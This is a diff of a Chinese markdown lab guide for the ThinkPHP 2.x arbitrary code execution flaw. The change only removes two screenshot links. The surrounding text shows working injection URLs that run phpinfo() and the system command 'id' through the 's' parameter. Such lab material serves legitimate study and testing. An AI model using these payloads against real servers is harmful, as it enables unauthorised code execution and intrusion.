@@ -31,7 +31,7 @@ docker-compose up -d
 
 直接访问 `http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D` 即可执行 `phpinfo()`：
 
-![image-20220302144931898](./.resource/ThinkPHP-2.x-任意代码执行漏洞/media/202203021449975.png)
+
 
 
 执行系统命令：
@@ -40,7 +40,7 @@ docker-compose up -d
 http://your-ip:8080/index.php?s=/index/index/name/$%7Bsystem(id)%7D
 ```
 
-![image-20220302145029395](./.resource/ThinkPHP-2.x-任意代码执行漏洞/media/202203021450448.png)
+
 
 
 ---
